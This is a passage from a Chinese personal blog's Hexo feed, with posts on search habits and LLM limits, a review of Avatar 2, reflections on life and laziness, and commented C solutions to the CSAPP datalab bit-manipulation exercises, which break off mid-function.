          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> TED </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息检索</title>
      <link href="/2023/12/15/information/"/>
      <url>/2023/12/15/information/</url>
      
        <content type="html"><![CDATA[<p><strong>搜索是一项伟大的方面,我们通过它在互联网的大海内捞针,但很多时候我们都是不懂且不知道如何去搜索的.</strong></p><hr><h3 id="明晰搜索的目的"><a href="#明晰搜索的目的" class="headerlink" title="明晰搜索的目的"></a>明晰搜索的目的</h3><p>搜索是用来明确,或者扩充知识的,加深记忆,而不是用来学习系统知识的,单纯的靠搜索想啥都不用知道的使用别人写好的框架就是天方夜谭</p><h3 id="搜索之难"><a href="#搜索之难" class="headerlink" title="搜索之难"></a>搜索之难</h3><p>互联网的咨询很多,大家都知道,总会有人犯过你犯过的错并且给出了一条限制性的解决办法,而我能有所思考是源于这几日对各种新东西的尝试,查询资料而产生的对搜索的困惑,例如以下:</p><blockquote><ul><li>这两天配置fluid和next的主题的时候,不会JavaScript语言,开始时在网上盲目的搜索,胡乱抄写别人的配置,欲实现加密功能和新的page(类似于小土刀2.0),最后高不成低不就,反正是浪费了大量时间</li><li>配置csapp和xv6的环境时,自己看不太懂lab的框架,只好在互联网上不断地搜索,翻阅了许多的相同的或者超级相似的表明同一个意思的垃圾咨询,只能感慨国内互联网的专业资讯都是在不断地互相抄,毫无创新性,时效性的垃圾(至少有许多是),且没有维护性,知其然不知其所以然</li><li>配置vscode在mac下和windows的配置环境时,先是在网上不断找别人写好的四大件,改一改,试一试,不加任何的思考,也不去参阅官方文档,浪费了大量的时间,时间成果转化率极低</li></ul></blockquote><h3 id="搜索要求"><a href="#搜索要求" class="headerlink" title="搜索要求"></a>搜索要求</h3><p>现在我们很多人都是不会搜索,不会以专业的词汇来描述自己的问题,就根本找不到,只能接受到大量的广告和毫不相干的网站.好比我之前不知道EOF这个术语,导致用各种其他语言都无法搜索到实现EOF这个功能的按键.</p><blockquote><p>EOF，为End Of File的缩写，通常在文本的最后存在此字符表示资料结束。</p></blockquote><p>想要提高搜索的效率,我认为有以下几个选项</p><p>遇到不懂的便系统性学习这个方面的知识,建立完善的脉络</p><p>设立一个区分性,想清楚几个事物间的关联性和重要性,比如我配置hexo的主题和我写博客其实没有什么关系,所以理智告诉我在挣扎了半个小时不得果时我应该放弃,去干与当下更有收益的事情.</p><h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><h4 id="对大模型的思考"><a href="#对大模型的思考" class="headerlink" title="对大模型的思考"></a>对大模型的思考</h4><p>发现现在的大模型有个缺点就是缺少了一些偏门知识点的语料,或者说是上古时代至今的语言进化史留下来的老而僵的死东西,比如在函数声明里面写</p><pre class="line-numbers language-none"><code class="language-none">#include&lt;iostream&gt;using namespace std;void franc(int &#x3D; 1, int &#x3D; 2)&#123;    int x;    cin &gt;&gt; x;    cout&lt;&lt;x*2;    &#125;int main()&#123;    franc(4, 3);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>gpt会毫不犹豫的纠正你,但这个确实是能跑的,导致我一度怀疑这样子的写法有何意义<del>,但他做函数声明时这样写确实emmm也不好说,先放着吧</del></p><h4 id="对自己的反思"><a href="#对自己的反思" class="headerlink" title="对自己的反思"></a>对自己的反思</h4><p>自己对盲目的搜索产生了依赖性,很多细碎的知识点,最好的学习方法应该是挑个有空的时间去研究一整个体系结构,从最底层学起,而不是什么都依靠搜索,搜索是建立在知道大家把这种东西叫什么的基础上的,没有基础的认知,想要依靠模糊搜索只会浪费大量的时间,要去衡量花费的预计时间成本,及时止损.</p><p>多多思考,多多进步</p><p>**4-28:**反思是件好事，会反思才会思考，会衡量利弊对错，会思考人何为人，但我就是那种只会反思不会落实的人，一次又一次的反思，给自己的潜意识加上一层层枷锁，但好似不会灵验，该茫然茫然，该依赖依赖，所以我对我上文提出的思考方法提出了这么些可行性的质疑，真的能够在正常人（例如我）身上无限次复现吗？答案是不可能，我的策略太过的理想化，最近在学shell lab，即Exception Control Flow，看书真的是看的晕晕的，先看的笔记，发现不够清楚，想着直接从最底层学起，太累了，看着看着书就困了，晕了，迷糊了。</p><p>所以呀，该要全神贯注的看书，才能够践行这个方法，撇去社交，撇去手机，一种我认为的专注时间：<strong>从上一次社交到下一次社交的间隔</strong></p><p>专注的中断会造成在专注末端的学习无效化！</p><h3 id="Good-Luck"><a href="#Good-Luck" class="headerlink" title="Good Luck"></a>Good Luck</h3><blockquote><p>愿汝之体恒满精力，愿汝之心恒葆青春。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PASTFUTURE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
            <tag> 镜花水月 </tag>
            
            <tag> 互联网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈阿凡达2</title>
      <link href="/2023/12/14/avator/"/>
      <url>/2023/12/14/avator/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>今日，于发呆之中畅想人生，浅浅做了一套四级卷子之后，便查阅起我的电影仓库，恍然间发现，半年多前加入库中的《阿凡达2》竟然迟迟未看，便将其看完，中途及结束有诸多感慨</p></blockquote><h2 id="大致观感"><a href="#大致观感" class="headerlink" title="大致观感"></a>大致观感</h2><p>初掠此影片，一打眼便是《阿凡达1》的传统风格，色彩绚丽奇幻，特效精美绝伦，确实是一部好莱坞的质量过关的大作，但也仅限如此。</p><p>在前半段困惑于其主题：水之道。水在哪？故事情节无非就是天空人再次降临潘多拉，侵占潘多拉，然后主角（已化为阿凡达）带领家庭逃离，对就是逃离。以保护家庭为理由换了一个部落——海部落寻求存亡，然后又发生一把战斗，便草草收场。让我不经怀疑，这废了老大的劲才干掉了天空人的一艘捕猎号，意义何在？保护了家人？自己儿子还死了一个。如果说，导演组没活了下一次可以搞个草之道，沙漠之道，再出一点小怪兽，然后再来一场家庭的戏码，保护家人，和反牌继续打复活赛。这完全的架空世界观可以让这个系列持续的播下去，十年一部就等了个这个纯纯的动效电影，毫无深意或者说是老套的剧情可言，全篇的家庭，族人的情节渲染使得我很难认真的去看这猜的到走向的故事发展<del>本还以为主角会带领图琨进攻人类基地，毕竟在开始确实给了基地一个俯拍的视角，谁知就出现了一下</del>，只能说这部影片浪费了我的三个小时，或者说我已三个小时满足了心中的情怀吧。</p>]]></content>
      
      
      <categories>
          
          <category> PASTFUTURE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> 镜花水月 </tag>
            
            <tag> 电影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人之所向</title>
      <link href="/2023/12/12/communication/"/>
      <url>/2023/12/12/communication/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>对人为何，何为人的思考每每绊人心，十余年来不得明了，或许也是，毕竟文人墨客千百余年朝天发问，也只落得一个无病呻吟的恶名，但呀，人不总是这样，总想一抒己见，以表情感。</p></blockquote><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>人的目的是什么？一个人活着是为了什么？你学习是为了什么？抛去那些莫须有的，自我欺骗的借口<del>考研，考公，绩点</del>，我只想问，一个人该干什么？还是说人之所以为人就在于他可以自由的支配自己的生活，自由的承担选择的后果，也自由的后悔。</p><h3 id="态度"><a href="#态度" class="headerlink" title="态度"></a>态度</h3><p>何为态度？如何的态度才是正确的？</p><p>这几日军训。主打一个锻炼集体意识，锻炼记录，锻炼团队，但教官是很人性化的，知道学生需要什么，不需要什么，就像是一场贸易，双方都知道其所需，可见生活的不同阶段，不同经历，都需要不同的态度，当然，这些态度也可以抽象化，以认真，遵守，概括一切，但这未免太过于敷衍且不切合实际了，但深究起来又会无趣无味。</p><p>当然，大脑思绪混乱，吾到至今也未曾想好怎么回答这个问题，从小便接触我是谁，我在哪，我要去哪这个问题，到之后开始探讨最完美的死亡方式，掌控死亡，突然有个荒诞的念想，完美的死亡不就是活着么，想活着所经受的压力，困苦实在是太多太多，死了一了百了，生不带来，死不带去，但活着才能感受痛苦，从心理到生理，当然也能收获温暖，快乐，和幸福。</p><h4 id="惰性"><a href="#惰性" class="headerlink" title="惰性"></a>惰性</h4><p>人是有惰性的,自我感觉人总会潜移默化的被他人所影响和改变,具体体现在自己的口头禅,说话风格的一些细小的改变,对人处事态度的细小变化,还有思想行为习惯的重点变化,但是呀,当一个人脱离熟悉的环境太久,或者是换到了另一个熟悉的环境,脱离了那群互相影响的人之后,那与生俱来,或者说是存在了太久的思想惯性—惰性便会主导你的行为,让你能够有勇气在床上躺到中午,让你有勇气在床上玩手机玩到凌晨,让你有勇气在打破自己的所有计划,让你有勇气和曾经的进化说ByeBye,人,是复杂的,离谱的,不受控的.</p><p>当然,也有可能是我的改变不够深刻,那巨大的思维惯性始终在引导我往我理性的反方向前进,<strong>革命之路,任重道远</strong>.</p><h3 id="Good-Lucky"><a href="#Good-Lucky" class="headerlink" title="Good Lucky"></a>Good Lucky</h3><blockquote><p>保持思考，保持敬畏</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PASTFUTURE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 镜花水月 </tag>
            
            <tag> 人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP的lab1-datalab</title>
      <link href="/2023/12/11/lab1/"/>
      <url>/2023/12/11/lab1/</url>
      
        <content type="html"><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ul><li>位运算(对!,^,&amp;,~,|,这些符号的准确理解)</li><li>float的规格化,非规格化</li><li>熟练使用二进制分析</li><li>充分清楚逻辑右移和算术右移的区别,以及知道计算机的默认移动</li></ul><h3 id="做题策略"><a href="#做题策略" class="headerlink" title="做题策略"></a>做题策略</h3><ul><li>十分建议自己充分思考,画图举例子,建议从四个bits的位开始举例子</li><li>真的不行就看看视频讲解吧,在这里推荐一个b站up的csapp讲解(主要是由于本人不喜欢看文字)</li></ul><blockquote><p><a href="https://www.bilibili.com/video/BV183411k7VM/?spm_id_from=333.337.search-card.all.click&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">【深入理解计算机系统 实验1 CSAPP】datalab + 环境搭建 data lab_哔哩哔哩_bilibili</a></p></blockquote><ul><li>建议把书本认真的看完第一章,我是看到一半到浮点数的规格化就没耐心了,直接做题,导致有较大阻碍</li></ul><h3 id="代码分享和讲解"><a href="#代码分享和讲解" class="headerlink" title="代码分享和讲解"></a>代码分享和讲解</h3><p>以下是写好的代码,里面有大量的注释便于理解(是在官方给的bit.c中补充函数的功能)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token comment">/* * CS:APP Data Lab * * &lt;Please put your name and userid here> * zhzvite 2811215248@qq.com * bits.c - Source file with your solutions to the Lab. *          This is the file you will hand in to your instructor. * * WARNING: Do not include the &lt;stdio.h> header; it confuses the dlc * compiler. You can still use printf for debugging without including * &lt;stdio.h>, although you might get a compiler warning. In general, * it's not good practice to ignore compiler warnings, but in this * case it's OK. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span><span class="token comment">//lab的规则(类似与游戏规则)</span></span><span class="token comment">/* * Instructions to Students: * * STEP 1: Read the following instructions carefully. */</span>You will provide your solution to the Data Lab byediting the collection of functions in this source file<span class="token punctuation">.</span>INTEGER CODING RULES<span class="token operator">:</span>   Replace the <span class="token string">"return"</span> statement in each function with one  or more lines of C code that implements the function<span class="token punctuation">.</span> Your code   must conform to the following style<span class="token operator">:</span>   <span class="token keyword">int</span> <span class="token function">Funct</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">/* brief description of how your implementation works */</span>      <span class="token keyword">int</span> var1 <span class="token operator">=</span> Expr1<span class="token punctuation">;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token keyword">int</span> varM <span class="token operator">=</span> ExprM<span class="token punctuation">;</span>      varJ <span class="token operator">=</span> ExprJ<span class="token punctuation">;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      varN <span class="token operator">=</span> ExprN<span class="token punctuation">;</span>      <span class="token keyword">return</span> ExprR<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  Each <span class="token string">"Expr"</span> is an expression using ONLY the following<span class="token operator">:</span>  <span class="token number">1.</span> Integer constants <span class="token number">0</span> through <span class="token number">255</span> <span class="token punctuation">(</span><span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">,</span> inclusive<span class="token punctuation">.</span> You are      not allowed to use big constants such as <span class="token number">0xffffffff.</span>  <span class="token number">2.</span> Function arguments and local <span class="token function">variables</span> <span class="token punctuation">(</span>no global variables<span class="token punctuation">)</span><span class="token punctuation">.</span>  <span class="token number">3.</span> Unary integer operations <span class="token operator">!</span> <span class="token operator">~</span>  <span class="token number">4.</span> Binary integer operations <span class="token operator">&amp;</span> <span class="token operator">^</span> <span class="token operator">|</span> <span class="token operator">+</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">>></span>      Some of the problems restrict the set of allowed operators even further<span class="token punctuation">.</span>  Each <span class="token string">"Expr"</span> may consist of multiple operators<span class="token punctuation">.</span> You are not restricted to  one operator per line<span class="token punctuation">.</span>  You are expressly forbidden to<span class="token operator">:</span>  <span class="token number">1.</span> Use any control constructs such as <span class="token keyword">if</span><span class="token punctuation">,</span> <span class="token keyword">do</span><span class="token punctuation">,</span> <span class="token keyword">while</span><span class="token punctuation">,</span> <span class="token keyword">for</span><span class="token punctuation">,</span> <span class="token keyword">switch</span><span class="token punctuation">,</span> etc<span class="token punctuation">.</span>  <span class="token number">2.</span> Define or use any macros<span class="token punctuation">.</span>  <span class="token number">3.</span> Define any additional functions in this file<span class="token punctuation">.</span>  <span class="token number">4.</span> Call any functions<span class="token punctuation">.</span>  <span class="token number">5.</span> Use any other operations<span class="token punctuation">,</span> such as <span class="token operator">&amp;&amp;</span><span class="token punctuation">,</span> <span class="token operator">||</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">,</span> or <span class="token operator">?</span><span class="token operator">:</span>  <span class="token number">6.</span> Use any form of casting<span class="token punctuation">.</span>  <span class="token number">7.</span> Use any data type other than <span class="token keyword">int</span><span class="token punctuation">.</span>  This implies that you     cannot use arrays<span class="token punctuation">,</span> structs<span class="token punctuation">,</span> or unions<span class="token punctuation">.</span>   You may assume that your machine<span class="token operator">:</span>  <span class="token number">1.</span> Uses <span class="token number">2</span>s complement<span class="token punctuation">,</span> <span class="token number">32</span><span class="token operator">-</span>bit representations of integers<span class="token punctuation">.</span>  <span class="token number">2.</span> Performs right shifts arithmetically<span class="token punctuation">.</span>  <span class="token number">3.</span> Has unpredictable behavior when shifting <span class="token keyword">if</span> the shift amount     is less than <span class="token number">0</span> or greater than <span class="token number">31.</span>EXAMPLES OF ACCEPTABLE CODING STYLE<span class="token operator">:</span>  <span class="token comment">/*   * pow2plus1 - returns 2^x + 1, where 0 &lt;= x &lt;= 31   */</span>  <span class="token keyword">int</span> <span class="token function">pow2plus1</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token comment">/* exploit ability of shifts to compute powers of 2 */</span>     <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">/*   * pow2plus4 - returns 2^x + 4, where 0 &lt;= x &lt;= 31   */</span>  <span class="token keyword">int</span> <span class="token function">pow2plus4</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token comment">/* exploit ability of shifts to compute powers of 2 */</span>     <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>     result <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>FLOATING POINT CODING RULESFor the problems that require you to implement floating<span class="token operator">-</span>point operations<span class="token punctuation">,</span>the coding rules are less strict<span class="token punctuation">.</span>  You are allowed to use looping andconditional control<span class="token punctuation">.</span>  You are allowed to use both ints and unsigneds<span class="token punctuation">.</span>You can use arbitrary integer and <span class="token keyword">unsigned</span> constants<span class="token punctuation">.</span> You can use any arithmetic<span class="token punctuation">,</span>logical<span class="token punctuation">,</span> or comparison operations on <span class="token keyword">int</span> or <span class="token keyword">unsigned</span> data<span class="token punctuation">.</span>You are expressly forbidden to<span class="token operator">:</span>  <span class="token number">1.</span> Define or use any macros<span class="token punctuation">.</span>  <span class="token number">2.</span> Define any additional functions in this file<span class="token punctuation">.</span>  <span class="token number">3.</span> Call any functions<span class="token punctuation">.</span>  <span class="token number">4.</span> Use any form of casting<span class="token punctuation">.</span>  <span class="token number">5.</span> Use any data type other than <span class="token keyword">int</span> or <span class="token keyword">unsigned</span><span class="token punctuation">.</span>  This means that you     cannot use arrays<span class="token punctuation">,</span> structs<span class="token punctuation">,</span> or unions<span class="token punctuation">.</span>  <span class="token number">6.</span> Use any floating point data types<span class="token punctuation">,</span> operations<span class="token punctuation">,</span> or constants<span class="token punctuation">.</span>NOTES<span class="token operator">:</span>  <span class="token number">1.</span> Use the <span class="token function">dlc</span> <span class="token punctuation">(</span>data lab checker<span class="token punctuation">)</span> <span class="token function">compiler</span> <span class="token punctuation">(</span>described in the handout<span class="token punctuation">)</span> to      check the legality of your solutions<span class="token punctuation">.</span>  <span class="token number">2.</span> Each function has a maximum number of <span class="token function">operations</span> <span class="token punctuation">(</span>integer<span class="token punctuation">,</span> logical<span class="token punctuation">,</span>     or comparison<span class="token punctuation">)</span> that you are allowed to use <span class="token keyword">for</span> your implementation     of the function<span class="token punctuation">.</span>  The max operator count is checked by dlc<span class="token punctuation">.</span>     Note that <span class="token function">assignment</span> <span class="token punctuation">(</span><span class="token char">'='</span><span class="token punctuation">)</span> is not counted<span class="token punctuation">;</span> you may use as many of     these as you want without penalty<span class="token punctuation">.</span>penalty<span class="token operator">:</span>罚款  <span class="token number">3.</span> Use the btest test <span class="token function">harness</span><span class="token punctuation">(</span>马具<span class="token punctuation">,</span>挽具<span class="token punctuation">)</span> to check your functions <span class="token keyword">for</span> correctness<span class="token punctuation">.</span>  <span class="token number">4.</span> Use the BDD checker to formally verify your functions  <span class="token number">5.</span> The maximum number of ops <span class="token keyword">for</span> each function is given in the     header comment <span class="token keyword">for</span> each function<span class="token punctuation">.</span> If there are any inconsistencies      between the maximum ops in the writeup and in this file<span class="token punctuation">,</span> consider     this file the authoritative source<span class="token punctuation">.</span><span class="token comment">/* * STEP 2: Modify the following functions according the coding rules. *  *   IMPORTANT. TO AVOID GRADING SURPRISES: *   1. Use the dlc compiler to check that your solutions conform *      to the coding rules. *   2. Use the BDD checker to formally verify that your solutions produce  *      the correct answers. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span><span class="token comment">//有一些生词,但是不影响阅读</span></span><span class="token comment">// 1</span><span class="token comment">/* * bitXor - x^y using only ~ and &amp; *   Example: bitXor(4, 5) = 1 *   Legal ops: ~ &amp; *   Max ops: 14 *   Rating: 1 */</span><span class="token keyword">int</span> <span class="token function">bitXor</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span>x <span class="token operator">&amp;</span> <span class="token operator">~</span>y<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/*  讲解:~(~x&amp;~y)把x,y中都为0的位置标记为0,其余都为1  ~(x&amp;y)则是把x,y中对应两个都为1的位置标记成0,其余都为1  故两个相&amp;就是异或的功能  */</span><span class="token punctuation">&#125;</span><span class="token comment">/* * tmin - return minimum two's complement integer *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 4 *   Rating: 1 */</span><span class="token keyword">int</span> <span class="token function">tmin</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 最小的二进制补码的整数,那就是最高位为1,其余位置全为0,int为4个字节,即为32个bit</span><span class="token punctuation">&#125;</span><span class="token comment">/* * isTmax - returns 1 if x is the maximum, two's complement number, *     and 0 otherwise *   Legal ops: ! ~ &amp; ^ | + *   Max ops: 10 *   Rating: 1 */</span><span class="token keyword">int</span> <span class="token function">isTmax</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/*   特判x=-1的情况,用两次!!,把他变为0或者1   (~(x+1))^x)来验证x是否为最大值   需要注意,判断a==b,在位运算下这样操作   !(a^b),为1则相同,为0则不同  */</span><span class="token punctuation">&#125;</span><span class="token comment">/* * allOddBits - return 1 if all odd-numbered bits in word set to 1 *   where bits are numbered from 0 (least significant) to 31 (most significant) *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 12 *   Rating: 2 */</span><span class="token keyword">int</span> <span class="token function">allOddBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 首先注意,0xAAAAAAAA这样的串都是从第0位开始,别搞错了</span>  <span class="token comment">// 本题思路是让x|0xAAAAAAAA再和x判断相不相等</span>  <span class="token comment">// 故a,b,c是为了通过移位造出0xAAAAAAAA,可以用这种办法继续造10个A,12个A,以此类推</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0xAA</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> b <span class="token operator">=</span> a <span class="token operator">|</span> <span class="token number">0xAA</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> c <span class="token operator">=</span> b <span class="token operator">&lt;&lt;</span> <span class="token number">16</span> <span class="token operator">|</span> b<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">|</span> c<span class="token punctuation">)</span> <span class="token operator">^</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* * negate - return -x *   Example: negate(1) = -1. *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 5 *   Rating: 2 */</span><span class="token keyword">int</span> <span class="token function">negate</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">~</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 这里我是以四个bits为例子,随便列举了几个,就试出来了</span><span class="token punctuation">&#125;</span><span class="token comment">// 3</span><span class="token comment">/* * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9') *   Example: isAsciiDigit(0x35) = 1. *            isAsciiDigit(0x3a) = 0. *            isAsciiDigit(0x05) = 0. *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 15 *   Rating: 3 */</span><span class="token keyword">int</span> <span class="token function">isAsciiDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> cond1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 检查除去前四位是不是满足条件,满足则为1</span>  <span class="token keyword">int</span> b <span class="token operator">=</span> x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">;</span>              <span class="token comment">// 这样就是只保留后四位</span>  <span class="token keyword">int</span> cond2 <span class="token operator">=</span> <span class="token punctuation">(</span>b <span class="token operator">+</span> <span class="token operator">~</span><span class="token number">0xA</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">;</span> <span class="token comment">// 要让b为0~9之间,则我们知道b-10&lt;0,并且我们知道-x=~x+1,0xA=10,所以用b+~0xA+1再右移31位,判断负号</span>  <span class="token keyword">return</span> cond1 <span class="token operator">&amp;</span> cond2<span class="token punctuation">;</span><span class="token comment">//要满足(除去后四位其他位一样)和(后四位符合(0~9)-10&lt;0)两种情况</span><span class="token punctuation">&#125;</span><span class="token comment">/* * conditional - same as x ? y : z *   Example: conditional(2,4,5) = 4 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 16 *   Rating: 3 */</span><span class="token keyword">int</span> <span class="token function">conditional</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    x <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span>x<span class="token punctuation">;</span>                   <span class="token comment">// 将x转化为bool类型,注意0取反全是0,1取反全是1,妙!</span>  x <span class="token operator">=</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token comment">//-(1)的补码全是1,-(0)的补码全是0,要巧妙运用这个性质,因为max ops限制在6</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">&amp;</span> y<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token operator">~</span>x <span class="token operator">&amp;</span> z<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 通过取反,来达成分支的效果,因为他们的取反是可以互相转化的,反正我是没想到</span><span class="token punctuation">&#125;</span><span class="token comment">/* * isLessOrEqual - if x &lt;= y  then return 1, else return 0 *   Example: isLessOrEqual(4,5) = 1. *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 24 *   Rating: 3 */</span><span class="token keyword">int</span> <span class="token function">isLessOrEqual</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> cond1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">^</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 判断x和y相等</span>  <span class="token keyword">int</span> signx <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 拿到x,y的符号,分别位signx和signy</span>  <span class="token keyword">int</span> signy <span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// 接下来判断异号</span>  <span class="token comment">// x+y-</span>  <span class="token keyword">int</span> cond2 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">!</span>signx <span class="token operator">&amp;</span> signy<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// signx=0,signy=1,cond2=0</span>  <span class="token comment">// x-y+</span>  <span class="token keyword">int</span> cond3 <span class="token operator">=</span> <span class="token punctuation">(</span>signx <span class="token operator">&amp;</span> <span class="token operator">!</span>signy<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// cond3=1</span>  <span class="token comment">// 接下来是同号的情况,同号相减不会溢出</span>  <span class="token keyword">int</span> res <span class="token 